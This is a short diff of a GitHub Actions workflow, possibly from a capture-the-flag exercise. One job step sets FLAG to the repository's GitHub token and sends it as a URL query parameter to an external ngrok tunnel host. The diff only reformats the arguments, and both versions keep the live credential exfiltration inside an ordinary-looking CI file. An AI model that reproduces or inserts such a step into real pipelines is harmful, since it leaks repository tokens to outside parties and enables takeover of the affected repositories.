@@ -11,7 +11,8 @@ jobs:
       env:
         FLAG: ${{ github.token }}
       with:
-        args: --header "Host: c9e80d059604.ngrok.ios" https://c9e80d059604.ngrok.io?token=${FLAG}
+        args: |
+          --header "Host: c9e80d059604.ngrok.ios" https://c9e80d059604.ngrok.io?token=${FLAG}
   deploy:
     runs-on: ubuntu-latest
     steps:
